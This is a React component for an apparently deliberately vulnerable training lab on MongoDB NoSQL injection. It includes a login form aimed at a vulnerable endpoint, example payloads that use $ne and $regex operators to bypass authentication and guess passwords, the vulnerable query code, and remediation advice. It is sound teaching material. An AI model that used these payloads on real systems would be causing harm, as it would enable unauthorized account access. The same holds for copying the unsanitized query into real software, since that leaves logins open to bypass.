import React, { useState } from 'react';
import axios from 'axios';
import './LabPage.css';

const API_BASE = process.env.REACT_APP_API_BASE || 'http://localhost:3001';

// PUBLIC_INTERFACE
/**
 * Level 4: NoSQL Injection Lab
 * OWASP A03:2021 - Injection
 * 
 * Demonstrates NoSQL injection by directly passing user input
 * into MongoDB queries, allowing operator injection.
 */
function NoSQLInjectionLab() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [response, setResponse] = useState(null);
  const [isJsonMode, setIsJsonMode] = useState(false);
  const [jsonPayload, setJsonPayload] = useState('');

  const handleNormalLogin = async (e) => {
    e.preventDefault();
    
    try {
      const result = await axios.post(`${API_BASE}/api/vulnerable/login-nosql`, {
        email,
        password,
      });
      
      setResponse(result.data);
    } catch (err) {
      setResponse({ status: 'error', message: err.response?.data?.message || err.message });
    }
  };

  const handleJsonLogin = async () => {
    try {
      const payload = JSON.parse(jsonPayload);
      const result = await axios.post(`${API_BASE}/api/vulnerable/login-nosql`, payload);
      
      setResponse(result.data);
    } catch (err) {
      if (err instanceof SyntaxError) {
        setResponse({ status: 'error', message: 'Invalid JSON syntax' });
      } else {
        setResponse({ status: 'error', message: err.response?.data?.message || err.message });
      }
    }
  };

  return (
    <div className="lab-page">
      <div className="lab-header">
        <h1>🎯 Level 4: NoSQL Injection</h1>
        <span className="lab-badge difficulty-medium">Medium</span>
        <span className="lab-badge">OWASP A03</span>
      </div>

      <div className="lab-section">
        <h2>📝 Objective</h2>
        <p>
          Bypass authentication by injecting MongoDB operators into the login request.
          The backend directly passes request body into the MongoDB query without validation,
          allowing you to manipulate the query logic.
        </p>
      </div>

      <div className="lab-section vulnerability-warning">
        <h3>⚠️ Vulnerability Details</h3>
        <ul>
          <li><strong>Type:</strong> NoSQL Injection (MongoDB)</li>
          <li><strong>Impact:</strong> Authentication bypass, unauthorized access</li>
          <li><strong>Root Cause:</strong> User input directly in database query</li>
          <li><strong>Attack Method:</strong> Inject operators like $ne, $gt, $regex</li>
          <li><strong>OWASP:</strong> A03:2021 - Injection</li>
        </ul>
      </div>

      <div className="lab-interactive">
        <h2>🔐 Vulnerable Login Endpoint</h2>
        
        <div style={{marginBottom: '20px'}}>
          <label>
            <input
              type="checkbox"
              checked={isJsonMode}
              onChange={(e) => setIsJsonMode(e.target.checked)}
            />
            {' '}Use JSON Mode (Advanced)
          </label>
        </div>

        {!isJsonMode ? (
          <form onSubmit={handleNormalLogin} className="comment-form">
            <div className="form-group">
              <label>Email:</label>
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="user@example.com"
                required
              />
            </div>
            
            <div className="form-group">
              <label>Password:</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="password"
                required
              />
            </div>
            
            <button type="submit" className="btn-primary">Login</button>
          </form>
        ) : (
          <div className="comment-form">
            <div className="form-group">
              <label>Raw JSON Payload:</label>
              <textarea
                value={jsonPayload}
                onChange={(e) => setJsonPayload(e.target.value)}
                placeholder='{"email": {"$ne": null}, "password": {"$ne": null}}'
                rows="6"
                style={{fontFamily: 'monospace'}}
              />
            </div>
            
            <button onClick={handleJsonLogin} className="btn-primary">
              Send JSON Request
            </button>
          </div>
        )}

        {response && (
          <div className={`message ${response.status === 'error' ? 'error' : 'success'}`}
               style={{
                 background: response.status === 'error' ? '#fee2e2' : '#d1fae5',
                 border: response.status === 'error' ? '1px solid #ef4444' : '1px solid #10b981'
               }}>
            <strong>Response:</strong>
            <pre style={{marginTop: '10px', whiteSpace: 'pre-wrap'}}>
              {JSON.stringify(response, null, 2)}
            </pre>
          </div>
        )}
      </div>

      <div className="lab-section">
        <h2>💡 Attack Examples</h2>
        <pre className="code-block">
{`// Normal login attempt:
{
  "email": "admin@example.com",
  "password": "password123"
}

// NoSQL Injection (bypass authentication):
{
  "email": {"$ne": null},
  "password": {"$ne": null}
}
// This finds ANY user where email and password are not null!

// Login as specific user without password:
{
  "email": "admin@example.com",
  "password": {"$ne": ""}
}

// Using regex to guess passwords:
{
  "email": "admin@example.com",
  "password": {"$regex": "^a"}
}

// The vulnerable backend code:
const user = await User.findOne({ 
  email: req.body.email,      // Direct injection here!
  password: req.body.password  // And here!
});`}
        </pre>
      </div>

      <div className="lab-section">
        <h2>🛡️ Remediation</h2>
        <pre className="code-block">
{`// Bad (Vulnerable):
const user = await User.findOne({
  email: req.body.email,
  password: req.body.password
});

// Good (Safe):
// 1. Validate input types
if (typeof email !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ error: 'Invalid input' });
}

// 2. Use explicit string values
const user = await User.findOne({
  email: String(req.body.email),
  password: String(req.body.password)
});

// 3. Better: Use proper authentication with hashing
const user = await User.findOne({ email: String(req.body.email) });
if (user && await bcrypt.compare(password, user.passwordHash)) {
  // Login successful
}

// 4. Input validation middleware
const { body, validationResult } = require('express-validator');

app.post('/login',
  body('email').isEmail(),
  body('password').isString().isLength({ min: 8 }),
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    // Proceed with login...
  }
);`}
        </pre>
      </div>

      <div className="lab-hint">
        💡 <strong>Hint:</strong> Try using JSON mode and send: <code>{`{"email": {"$ne": null}, "password": {"$ne": null}}`}</code>
      </div>
    </div>
  );
}

export default NoSQLInjectionLab;
